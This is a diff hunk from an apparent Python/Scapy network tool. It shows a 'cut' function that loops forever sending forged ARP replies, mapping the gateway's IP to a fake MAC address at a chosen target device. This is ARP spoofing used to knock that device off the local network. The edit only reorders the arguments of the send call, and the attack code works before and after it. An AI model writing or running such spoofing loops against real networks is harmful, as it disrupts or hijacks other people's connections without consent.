@@ -53,7 +53,7 @@ for sent, received in result:
 
 def cut(target_ip, target_mac):
     while True:
-        send(ARP(op=2, psrc=gateway, hwsrc='12:34:56:78:9A:BC', pdst=target_ip, hwdst=target_mac), verbose=0)
+        send(ARP(pdst=target_ip, hwdst=target_mac,op=2, psrc=gateway, hwsrc='12:34:56:78:9A:BC', ), verbose=0)
 
 
 print("---------------")
